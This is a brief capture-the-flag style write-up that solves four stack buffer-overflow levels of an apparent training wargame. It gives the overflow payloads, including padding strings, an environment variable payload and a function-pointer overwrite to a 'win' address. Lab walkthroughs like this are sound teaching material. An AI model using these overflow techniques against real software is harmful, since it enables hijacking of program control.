##Stack0
from disassemble we notice that

```
lea eax, dword [local_1ch]
...
test eax, eax
je 0x8048427
```

so `modified` is stored as `eax` in stack
and we need try to overwrite this `eax`
as the address of `eax` is just after `buffer` in stack
so we just need input a string like `"A" * 64`

##Stack1
just like `stack0` just this time we need change modified to `0x61626364` which is `dcba` 
so the input is `'a'*64+'dcba'`

##Stack2
same as before just need set environment variable `GREENIE` with hex`0x0a0d0a0d`
so `export GREENIE=$'A..(64)\x0a\x0d\x0a\x0d'` this `$` is important here

##Stack3
still easy, we want the `win` function be called, which just need rewrite the `fp`
so use `gdb` to get the address of `win`(or just use r2 haha which I used)
```
> aaaa
> afl
```
then we get the `win` address is `0x08048424`
so just `print -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3`
